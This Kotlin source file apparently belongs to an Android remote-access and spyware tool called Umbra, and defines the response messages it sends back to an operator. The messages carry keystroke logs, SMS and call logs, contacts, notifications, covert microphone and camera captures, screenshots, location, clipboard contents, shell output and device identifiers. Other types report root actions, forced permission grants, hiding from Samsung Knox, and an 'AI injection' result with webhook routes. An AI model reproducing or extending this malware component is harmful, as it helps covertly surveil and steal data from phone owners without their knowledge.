package org.umbra.core.core

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

// ─── Sealed class hierarchy of all typed responses ──────────────────────────

@Serializable
sealed class UmbraResponse {

    @Serializable
    @SerialName("ping")
    data class PingResponse(
        val pong: Boolean = true,
        val latency_ms: Long = 0
    ) : UmbraResponse()

    @Serializable
    @SerialName("device_info")
    data class DeviceInfoResponse(
        val model: String,
        val brand: String,
        val manufacturer: String,
        val sdk: Int,
        val release: String,
        val fingerprint: String,
        val hardware: String,
        val android_id: String,
        val imei: String = ""
    ) : UmbraResponse()

    @Serializable
    @SerialName("file_list")
    data class FileListResponse(
        val entries: List<FileEntry>
    ) : UmbraResponse()

    @Serializable
    @SerialName("file_read")
    data class FileReadResponse(
        val file_id: String,
        val mime_type: String,
        val size_bytes: Long,
        val base64_data: String
    ) : UmbraResponse()

    @Serializable
    @SerialName("location")
    data class LocationResponse(
        val lat: Double,
        val lng: Double,
        val accuracy: Float,
        val provider: String
    ) : UmbraResponse()

    @Serializable
    @SerialName("shell")
    data class ShellResponse(
        val exit_code: Int,
        val stdout: String,
        val stderr: String
    ) : UmbraResponse()

    @Serializable
    @SerialName("camera")
    data class CameraResponse(
        val image_base64: String,
        val width: Int = 0,
        val height: Int = 0,
        val format: String = "JPEG",
        val size_bytes: Long = 0
    ) : UmbraResponse()

    @Serializable
    @SerialName("clipboard")
    data class ClipboardResponse(
        val provider_type: String,
        val vulnerability: String = "",
        val entry_count: Int,
        val entries: List<ClipboardEntry>
    ) : UmbraResponse()

    @Serializable
    @SerialName("permission_grant")
    data class PermissionGrantResponse(
        val target_permissions: List<String>,
        val granted: List<String>,
        val failed: List<String>,
        val details: String = ""
    ) : UmbraResponse()

    @Serializable
    @SerialName("knox_hide")
    data class KnoxHideResponse(
        val technique: String,
        val success: Boolean,
        val service_status: String,
        val target_package: String = "",
        val details: String = ""
    ) : UmbraResponse()

    @Serializable
    @SerialName("sms_list")
    data class SmsListResponse(
        val messages: List<SmsMessage>,
        val count: Int
    ) : UmbraResponse()

    @Serializable
    @SerialName("calls_list")
    data class CallLogResponse(
        val calls: List<CallEntry>,
        val count: Int
    ) : UmbraResponse()

    @Serializable
    @SerialName("contacts_list")
    data class ContactsResponse(
        val contacts: List<ContactEntry>,
        val count: Int
    ) : UmbraResponse()

    @Serializable
    @SerialName("screenshot")
    data class ScreenshotResponse(
        val image_base64: String,
        val width: Int = 0,
        val height: Int = 0,
        val format: String = "PNG",
        val size_bytes: Long = 0
    ) : UmbraResponse()

    @Serializable
    @SerialName("mic_recording")
    data class MicRecordingResponse(
        val audio_base64: String,
        val duration_seconds: Int,
        val format: String = "AAC",
        val size_bytes: Long = 0
    ) : UmbraResponse()

    @Serializable
    @SerialName("notifications_list")
    data class NotificationsResponse(
        val notifications: List<NotificationEntry>,
        val count: Int
    ) : UmbraResponse()

    @Serializable
    @SerialName("keylog_dump")
    data class KeylogResponse(
        val keystrokes: List<KeylogEntry>,
        val count: Int
    ) : UmbraResponse()

    @Serializable
    @SerialName("ai_injection")
    data class AiInjectionResponse(
        val action: String,
        val payload_type: String,
        val payload_size: Int,
        val webhook: String,
        val routes: Map<String, String>,
        val success: Boolean,
        val details: String
    ) : UmbraResponse()

    @Serializable
    @SerialName("sms_send")
    data class SmsSendResponse(
        val success: Boolean,
        val destination: String,
        val message: String,
        val details: String = ""
    ) : UmbraResponse()

    @Serializable
    @SerialName("live_status")
    data class LiveStatusResponse(
        val status: String,
        val monitors: Map<String, Boolean>
    ) : UmbraResponse()

    @Serializable
    @SerialName("live_event")
    data class LiveEventResponse(
        val event_type: String,
        // SMS fields
        val sms_address: String = "",
        val sms_body: String = "",
        val sms_date: Long = 0,
        val sms_type: String = "",
        // Call fields
        val call_number: String = "",
        val call_duration: Long = 0,
        // Screen fields
        val screen_action: String = "",
        // Package fields
        val package_name: String = "",
        val app_name: String = "",
        // Clipboard fields
        val clipboard_text: String = "",
        val clipboard_mime: String = "text/plain"
    ) : UmbraResponse()

    @Serializable
    @SerialName("root_check")
    data class RootCheckResponse(
        val status: String,
        val details: Map<String, String>
    ) : UmbraResponse()

    @Serializable
    @SerialName("root_action")
    data class RootActionResponse(
        val action: String,
        val success: Boolean,
        val results: Map<String, String>
    ) : UmbraResponse()

    @Serializable
    @SerialName("error")
    data class ErrorResponse(
        val error: String,
        val module: String
    ) : UmbraResponse()
}

// ─── Supporting types ───────────────────────────────────────────────────────

@Serializable
data class FileEntry(
    val id: String,
    val name: String,
    val size: Long,
    val date: Long,
    val path: String = ""
)

@Serializable
data class ClipboardEntry(
    val text: String = "",
    val mime_type: String = "text/plain",
    val timestamp: Long = 0,
    val uri: String = ""
)

@Serializable
data class SmsMessage(
    val id: String = "",
    val address: String = "",
    val body: String = "",
    val date: Long = 0,
    val read: Boolean = false,
    val type: String = "inbox"  // inbox, sent, draft
)

@Serializable
data class CallEntry(
    val number: String = "",
    val type: String = "",  // incoming, outgoing, missed
    val date: Long = 0,
    val duration: Long = 0
)

@Serializable
data class ContactEntry(
    val display_name: String = "",
    val phone_numbers: List<String> = emptyList(),
    val emails: List<String> = emptyList()
)

@Serializable
data class NotificationEntry(
    val package_name: String = "",
    val app_name: String = "",
    val title: String = "",
    val text: String = "",
    val timestamp: Long = 0
)

@Serializable
data class KeylogEntry(
    val text: String = "",
    val package_name: String = "",
    val timestamp: Long = 0
)

// ─── Response envelope — wraps all typed responses for transport ────────────

@Serializable
data class ResponseEnvelope(
    val type: String,
    val timestamp: Long = System.currentTimeMillis(),
    val device_id: String = "",
    val cmd_id: String = "",
    val status: String = "ok",
    val payload: UmbraResponse? = null,
    val error: String = ""
)
